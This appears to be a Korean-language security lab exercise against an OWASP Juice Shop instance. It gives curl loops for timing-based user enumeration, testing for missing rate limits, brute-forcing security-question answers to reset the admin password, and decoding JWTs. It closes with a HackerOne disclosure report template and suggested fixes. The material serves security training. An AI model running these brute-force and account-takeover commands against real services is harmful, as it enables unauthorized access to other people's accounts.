    ■ 임무 (4 단계, 약 40분)

    ▶ 1) 사용자 enumeration 시각 측정 (lab #1, T1589)
    `for u in admin nonexist user1 admin@juice-sh.op random123@x.com; do
       t1=$(date +%s%N); curl -s -o /dev/null -X POST -H "Content-Type: application/json"
       -d "{\"email\":\"$u\",\"password\":\"wrongpw\"}" http://10.20.30.80:3000/rest/user/login
       t2=$(date +%s%N); echo "$u: $(( (t2-t1)/1000000 )) ms"; done`
    응답 시간 차이 → bcrypt 비교 여부로 *유효 사용자 식별 가능* 추정.

    ▶ 2) Rate limit 부재 + 보안질문 brute (lab #5·#14)
    Rate limit:
    `for i in $(seq 1 30); do
       curl -s -o /dev/null -w "$i: %{http_code} " -X POST -H "Content-Type: application/json"
       -d '{"email":"admin@juice-sh.op","password":"wrong"}' http://10.20.30.80:3000/rest/user/login; done; echo`
    30회 모두 401 → rate limit 0. 응답에 *Retry-After / 429* 없음 캡처.

    보안질문 답 추정 (Madame, San Francisco, Captain 등 흔한 답):
    `for ans in "Garfield" "Captain" "Smith" "San Francisco"; do
       echo -n "$ans: "
       curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json"
       -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"newpw\",\"repeat\":\"newpw\"}"
       http://10.20.30.80:3000/rest/user/reset-password; done`

    ▶ 3) JWT 발급/회전 분석 (lab #6·#8)
    `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")`
    `echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null; echo; echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`
    alg / iat / exp 추출. exp - iat 가 *너무 큼* (예: 7일) → 토큰 회전 부재 약점.

    ▶ 4) HackerOne Disclosure 보고서 양식
    아래 그대로 출력 (실 H1 submit 양식):

    ```
    ■ Title
    [Auth] Rate limit absence on /rest/user/login + verbose error → user enumeration → password reset bypass chain

    ■ Severity (CVSS v3.1)
    8.1 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

    ■ Steps to Reproduce
    1. timing oracle: 30회 login (위 1단계) — 유효/무효 사용자 timing 차이 측정
    2. rate limit (위 2단계) — 30회 모두 401, 429 없음
    3. security question dictionary (위 2단계) — 흔한 답 50개 시도
    4. password reset (성공 시) → admin 계정 탈취

    ■ Impact
    - 단일 헌터가 30분 내 admin 계정 탈취 가능 (timing → enum → reset chain)
    - JWT exp 7일 → 탈취 후 일주일 지속 접근

    ■ Suggested Fix
    1. rate limit (Express express-rate-limit, 10req/15min/IP)
    2. login 응답 통일 (timing + content)
    3. password reset 보안질문 → 이메일 OTP 전환
    4. JWT exp 1시간 + refresh token rotation

    ■ Disclosure Timeline
    - Day 0: 보고 (HackerOne)
    - Day 30: triage 응답 기대
    - Day 60: fix 검증 (CVE 신청 협의)
    - Day 90: public disclosure

    ■ Bounty 추정
    Tier: High → 조회 가능 시 $500-2000 (program 정책 확인)
    ```

    종료: echo "=== 1) timing ===" / "=== 2) rate+reset ===" / "=== 3) JWT ===" / "=== 4) H1 보고서 ===" 묶음.
